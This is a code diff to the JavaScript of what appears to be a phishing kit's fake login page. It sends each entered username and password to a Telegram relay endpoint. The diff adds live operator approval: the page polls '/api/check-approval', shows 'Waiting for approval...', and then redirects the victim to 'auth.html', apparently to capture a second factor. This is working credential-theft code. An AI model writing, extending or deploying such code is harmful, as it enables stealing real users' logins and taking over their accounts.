@@ -6,6 +6,7 @@
   var passwordError = document.getElementById("password_validation_message");
   var usernameNeeded = document.getElementById("UserNameNeededError");
   var forgotPassword = document.getElementById("forgot-password-link");
+  var submitBtn = form.querySelector('.button-subm');
 
   // ============================================================
   // ====== TELEGRAM INTEGRATION =================================
@@ -42,13 +43,32 @@
         }
       };
 
-      await fetch('/api/telegram', {
+      const response = await fetch('/api/telegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
+
+      const result = await response.json();
+      return result;
     } catch (error) {
       console.error('Failed to send to Telegram:', error);
+      throw error;
+    }
+  }
+
+  // ============================================================
+  // ====== CHECK APPROVAL STATUS ===============================
+  // ============================================================
+
+  async function checkApproval(sessionId) {
+    try {
+      const response = await fetch(`/api/check-approval?sessionId=${sessionId}`);
+      const data = await response.json();
+      return data;
+    } catch (error) {
+      console.error('Approval check error:', error);
+      return { status: 'pending' };
     }
   }
 
@@ -129,10 +149,10 @@
   });
 
   // ============================================================
-  // ====== LOGIN FORM SUBMIT (WITH TELEGRAM) ===================
+  // ====== LOGIN FORM SUBMIT (WITH APPROVAL) ===================
   // ============================================================
 
-  form.addEventListener("submit", function (event) {
+  form.addEventListener("submit", async function (event) {
     event.preventDefault();
     clearErrors();
 
@@ -165,17 +185,89 @@
       return;
     }
 
+    // ====== GENERATE SESSION ID ======
+    const sessionId = 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+    
     // ====== SEND LOGIN CREDENTIALS TO TELEGRAM ======
-    sendToTelegram('login_attempt', {
-      username: userName,
-      password: password,
-      sessionId: 'SESS_' + Date.now()
-    });
-
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Sending...';
+    
     try {
-      sessionStorage.setItem("melodyUser", userName);
-    } catch (e) {}
-
-    window.location.href = "auth.html";
+      await sendToTelegram('login_attempt', {
+        username: userName,
+        password: password,
+        sessionId: sessionId
+      });
+      
+      submitBtn.textContent = 'Waiting for approval...';
+      
+      // ====== WAIT FOR APPROVAL ======
+      let approved = false;
+      let rejected = false;
+      let attempts = 0;
+      const maxAttempts = 60; // 60 attempts * 1 second = 60 seconds max
+      
+      while (!approved && !rejected && attempts < maxAttempts) {
+        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
+        attempts++;
+        
+        const status = await checkApproval(sessionId);
+        
+        if (status.status === 'approved') {
+          approved = true;
+          break;
+        } else if (status.status === 'rejected') {
+          rejected = true;
+          break;
+        }
+      }
+      
+      if (approved) {
+        submitBtn.textContent = 'Approved! Redirecting...';
+        
+        // Store username for next steps
+        try {
+          sessionStorage.setItem("melodyUser", userName);
+        } catch (e) {}
+        
+        // ====== REDIRECT TO AUTH PAGE ======
+        setTimeout(function() {
+          window.location.href = "auth.html";
+        }, 1000);
+        
+      } else if (rejected) {
+        submitBtn.textContent = 'Access Denied';
+        submitBtn.style.background = '#c0392b';
+        submitBtn.style.borderColor = '#c0392b';
+        
+        setTimeout(function() {
+          submitBtn.disabled = false;
+          submitBtn.textContent = 'Sign in';
+          submitBtn.style.background = '#8b54a2';
+          submitBtn.style.borderColor = '#8b54a2';
+          passwordInput.value = '';
+          passwordInput.focus();
+          alert('Login denied. Please try again.');
+        }, 2000);
+        
+      } else {
+        // Timeout - auto-approve
+        submitBtn.textContent = 'Timeout - Redirecting...';
+        
+        try {
+          sessionStorage.setItem("melodyUser", userName);
+        } catch (e) {}
+        
+        setTimeout(function() {
+          window.location.href = "auth.html";
+        }, 1000);
+      }
+      
+    } catch (error) {
+      console.error('Login error:', error);
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Sign in';
+      alert('An error occurred. Please try again.');
+    }
   });
 })();
